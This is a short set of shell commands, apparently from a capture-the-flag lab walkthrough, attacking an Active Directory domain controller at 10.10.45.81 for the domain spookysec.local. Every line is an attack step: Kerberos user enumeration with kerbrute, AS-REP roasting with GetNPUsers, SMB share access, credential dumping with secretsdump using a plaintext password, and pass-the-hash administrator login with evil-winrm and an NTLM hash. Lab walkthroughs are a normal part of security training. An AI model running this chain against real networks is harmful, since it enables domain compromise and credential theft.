...
./kerbrute_linux_amd64 userenum --dc 10.10.45.81 -d spookysec.local userlist_kerberos.txt
```
...
```shell
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/james -no-pass -dc-ip 10.10.45.81
```
...
```shell
smbclient -L //10.10.45.81 -W spookysec.local -U svc-admin
...
```shell
smbclient //10.10.45.81/backup -W spookysec.local -U svc-admin
```
...
```shell
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup@spookysec.local:backup2517860 -target-ip 10.10.45.81
```
...
```shell
evil-winrm -i 10.10.45.81 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
#remote login
```
